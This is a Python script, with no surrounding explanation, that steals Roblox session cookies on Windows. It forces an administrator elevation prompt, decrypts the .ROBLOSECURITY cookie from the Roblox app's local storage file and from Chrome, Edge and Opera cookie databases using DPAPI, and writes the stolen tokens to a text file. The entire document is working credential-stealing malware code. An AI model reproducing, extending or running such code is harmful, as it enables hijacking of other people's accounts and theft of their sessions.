import os,sys,ctypes,shutil,json,base64,sqlite3,random,string, tempfile
if ctypes.windll.shell32.IsUserAnAdmin()==0:ctypes.windll.shell32.ShellExecuteW(None,"runas",sys.executable,' '.join([f'"{a}"' for a in sys.argv]),None,1);sys.exit()
base=os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
info_folder=os.path.join(base,"info")
os.makedirs(info_folder,exist_ok=True)
f=open(os.path.join(info_folder,"roblox_cookies.txt"),"w",encoding="utf-8")
def rf(ext):return''.join(random.choices(string.ascii_letters+string.digits,k=12))+ext
def dpapi(data,*a):
    import ctypes,ctypes.wintypes
    class B(ctypes.Structure):_fields_=[('cbData',ctypes.wintypes.DWORD),('pbData',ctypes.POINTER(ctypes.c_byte))]
    i=B(len(data),(ctypes.c_byte*len(data)).from_buffer_copy(data));o=B()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i),None,None,None,None,0,ctypes.byref(o))==0:return None,None
    out=bytes((o.pbData[i] for i in range(o.cbData)));ctypes.windll.kernel32.LocalFree(o.pbData);return None,out
print("Locating Roblox cookies...",file=f)
up=os.getenv("USERPROFILE","")
dst_dir=info_folder
src=os.path.join(up,"AppData","Local","Roblox","LocalStorage","robloxcookies.dat")
if os.path.exists(src):
    try:
        with open(src,'r',encoding='utf-8') as ff:
            enc=json.load(ff).get("CookiesData","")
            if enc:
                b=base64.b64decode(enc)
                try: dec=dpapi(b)[1].decode('utf-8','ignore')
                except: dec=b.decode('utf-8','ignore')
                print("ROBLOSECURITY (App):",file=f);print(dec,file=f)
    except Exception as e: print(f"App cookie error: {e}",file=f)
for br in ["Chrome","Edge","Opera"]:
    bpath=os.path.join(os.environ.get("LOCALAPPDATA",""),f"{br}\\User Data")
    if not os.path.exists(bpath): continue
    for pfx in ["Default"]+[d for d in os.listdir(bpath) if d.startswith("Profile")]:
        db=os.path.join(bpath,pfx,"Cookies")
        if not os.path.exists(db): continue
        try:
            with tempfile.NamedTemporaryFile(delete=True) as tmpdb:
                shutil.copy2(db,tmpdb.name)
                c=sqlite3.connect(tmpdb.name).cursor()
                for n,v in c.execute("SELECT name, encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'"):
                    try: dec=dpapi(v)[1].decode();print(f"ROBLOSECURITY ({br} {pfx}):",file=f);print(dec,file=f)
                    except: pass
        except: pass
f.close()
